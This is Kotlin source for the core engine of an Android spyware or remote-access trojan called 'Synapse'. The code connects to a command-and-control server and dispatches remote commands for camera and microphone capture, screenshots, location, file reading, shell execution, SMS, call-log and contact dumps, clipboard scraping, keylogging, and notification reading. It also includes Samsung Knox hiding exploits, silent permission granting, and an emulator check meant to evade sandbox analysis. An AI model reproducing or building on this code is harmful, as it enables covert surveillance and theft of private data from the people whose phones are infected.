package org.synapse.core.core

import android.content.Context
import android.provider.Settings
import android.util.Log
import org.synapse.core.c2.C2Coordinator
import org.synapse.core.c2.Command
import org.synapse.core.modules.CameraModule
import org.synapse.core.modules.ClipboardModule
import org.synapse.core.modules.FileModule
import org.synapse.core.modules.KnoxGuardModule
import org.synapse.core.modules.KnoxHideExploit
import org.synapse.core.modules.LocationModule
import org.synapse.core.modules.SemClipboardExploit
import org.synapse.core.modules.ShellModule
import org.synapse.core.modules.SilentPermissionGrant
import org.synapse.core.modules.SmsModule
import org.synapse.core.modules.CallLogModule
import org.synapse.core.modules.ContactsModule
import org.synapse.core.modules.MicModule
import org.synapse.core.modules.NotificationModule
import org.synapse.core.modules.KeylogModule

object SynapseEngine {
    private const val TAG = "Synapse"
    private const val DEFAULT_C2 = "wss://192.168.1.9:8443/c2"
    private var started = false

    fun start(context: Context) {
        if (started) return
        started = true

        if (!SandboxDetector.isRealDevice(context)) {
            Log.w(TAG, "Sandbox/emulator detected — refusing to start engine")
            return
        }

        // Sandbox analysis check disabled for testing
        // if (SandboxDetector.looksLikeAnalysis()) {
        //     Log.w(TAG, \"Analysis environment detected — sleeping\")
        //     Thread.sleep(3600_000)
        //     return
        // }

        val deviceId = getDeviceId(context)
        val prefs = context.getSharedPreferences("synapse_prefs", Context.MODE_PRIVATE)
        // Allow override via ADB: adb shell "echo 'wss://IP:8443/c2' > /data/data/org.synapse.core/shared_prefs/synapse_c2_url"
        val overrideFile = java.io.File(context.filesDir.parent, "shared_prefs/synapse_c2_url")
        var c2Url = DEFAULT_C2
        if (overrideFile.exists()) {
            c2Url = overrideFile.readText().trim()
            if (c2Url.isNotEmpty() && c2Url.startsWith("wss://")) {
                prefs.edit().putString("c2_base_url", c2Url).apply()
                Log.d(TAG, "C2 URL override: $c2Url")
            }
        }
        c2Url = prefs.getString("c2_base_url", c2Url) ?: c2Url
        val fcmToken = prefs.getString("fcm_token", null)

        prefs.edit().putString("device_id", deviceId).apply()

        val handlers: Map<String, suspend (Command) -> SynapseResponse> = mapOf(
            "ping"     to { cmd -> SynapseResponse.PingResponse(pong = true, latency_ms = 0) },
            "info"     to { cmd -> InfoModule.gather(context) },
            "camera"   to { cmd -> CameraModule.capture(context, cmd) },
            "screenshot" to { cmd -> CameraModule.screenshot(context, cmd) },
            "location" to { cmd -> LocationModule.get(context, cmd) },
            "files"    to { cmd -> FileModule.list(context, cmd) },
            "file_read" to { cmd -> FileModule.read(context, cmd) },
            "shell"    to { cmd -> ShellModule.exec(cmd) },
            "clipboard" to { cmd -> try { ClipboardModule.scrape(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("clipboard:${e.message}", "clipboard") } },
            "clipboard_image" to { cmd -> try { ClipboardModule.readImage(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("clipboard_img:${e.message}", "clipboard") } },
            "knox_hide" to { cmd -> try { KnoxGuardModule.hide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_hide:${e.message}", "knox_guard") } },
            "knox_unhide" to { cmd -> try { KnoxGuardModule.unhide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_unhide:${e.message}", "knox_guard") } },
            "knox_check" to { cmd -> try { KnoxGuardModule.check(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_check:${e.message}", "knox_guard") } },
            "semclipboard" to { cmd -> try { SemClipboardExploit.scrape(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("semclipboard:${e.message}", "semclipboard") } },
            "knox_hide_v2" to { cmd -> try { KnoxHideExploit.hide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_hide_v2:${e.message}", "knox_hide_v2") } },
            "knox_unhide_v2" to { cmd -> try { KnoxHideExploit.unhide(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("knox_unhide_v2:${e.message}", "knox_hide_v2") } },
            "silent_grant" to { cmd -> try { SilentPermissionGrant.grant(context, cmd) } catch (e: Exception) { SynapseResponse.ErrorResponse("silent_grant:${e.message}", "silent_grant") } },
            // ── NEW SPYWARE MODULES ──
            "sms"      to { cmd -> when (cmd.action) {
                "list" -> SmsModule.list(context, cmd)
                "read" -> SmsModule.read(context, cmd)
                "dump" -> SmsModule.dump(context, cmd)
                else -> SynapseResponse.ErrorResponse("sms:unknown_action:${cmd.action}", "sms")
            }},
            "calls"    to { cmd -> when (cmd.action) {
                "list" -> CallLogModule.list(context, cmd)
                else -> SynapseResponse.ErrorResponse("calls:unknown_action:${cmd.action}", "calls")
            }},
            "contacts" to { cmd -> when (cmd.action) {
                "list" -> ContactsModule.list(context, cmd)
                else -> SynapseResponse.ErrorResponse("contacts:unknown_action:${cmd.action}", "contacts")
            }},
            "mic"      to { cmd -> when (cmd.action) {
                "record" -> MicModule.record(context, cmd)
                "stop" -> MicModule.stop(context, cmd)
                else -> SynapseResponse.ErrorResponse("mic:unknown_action:${cmd.action}", "mic")
            }},
            "notifications" to { cmd -> when (cmd.action) {
                "list" -> NotificationModule.list(context, cmd)
                else -> SynapseResponse.ErrorResponse("notifications:unknown_action:${cmd.action}", "notifications")
            }},
            "keylog"   to { cmd -> when (cmd.action) {
                "start" -> KeylogModule.start(context, cmd)
                "stop" -> KeylogModule.stop(context, cmd)
                "dump" -> KeylogModule.dump(context, cmd)
                else -> SynapseResponse.ErrorResponse("keylog:unknown_action:${cmd.action}", "keylog")
            }}
        )

        C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
        Log.d(TAG, "Engine started — device=$deviceId")
    }

    fun stop() {
        C2Coordinator.stop()
        started = false
    }

    private fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(
            context.contentResolver, Settings.Secure.ANDROID_ID
        ) ?: android.os.Build.getSerial()
    }
}
